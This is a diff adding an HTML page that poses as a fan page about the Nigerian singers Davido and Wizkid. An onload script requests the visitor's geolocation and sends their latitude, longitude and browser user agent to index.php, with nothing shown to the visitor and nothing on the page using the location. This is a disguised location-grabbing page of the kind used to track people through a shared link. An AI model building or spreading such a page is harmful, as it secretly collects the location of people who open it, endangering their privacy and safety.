@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Talented artists</title>
+</head>
+<style>
+    body{
+        text-align: center;
+        background-color: off-white;
+        color: black;
+        font-family: sans serif;
+    }
+    img{
+        height: 200px;
+        width: 150px;
+        border-radius: 5px;
+    }
+    big{
+        text-align: center;
+        color: grey;
+    }
+</style>
+<body onload="getLocation()">
+    <h1><b>Davido</b></h1>
+    <img src="free0.png" width="40%">
+    &nbsp &nbsp
+    <img src="free1.png" width="40%">
+    <p><b>David Adedeji Adeleke (born November 21, 1992), known professionally as Davido, is a Nigerian singer, songwriter and record producer. He is regarded as one of the most important Afrobeats artists of the 21st century, and for popularizing the genre globally.</b></p>
+    <br>
+    <h1><b>Wizkid</b></h1>
+    <img src="free2.png" width="40%">
+    &nbsp &nbsp
+    <img src="free3.png" width="40%">
+    <p><b>Ayodeji Ibrahim Balogun (born 16 July 1990), known professionally as Wizkid, is a Nigerian singer and songwriter. Born in the Ojuelegba suburb of Surulere, Lagos, Wizkid is a voice in the emerging Afrobeats movement. His music is a blend of Afrobeats, afropop, R&B, afrobeat, reggae, dancehall, and pop.</b></p>
+    <br>
+    
+    <big>See more</big>
+
+<p id="demo"></p>
+
+    <script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+  x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "index.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+  xhttp.send();
+}
+</script>
+</body>
+</html>
+
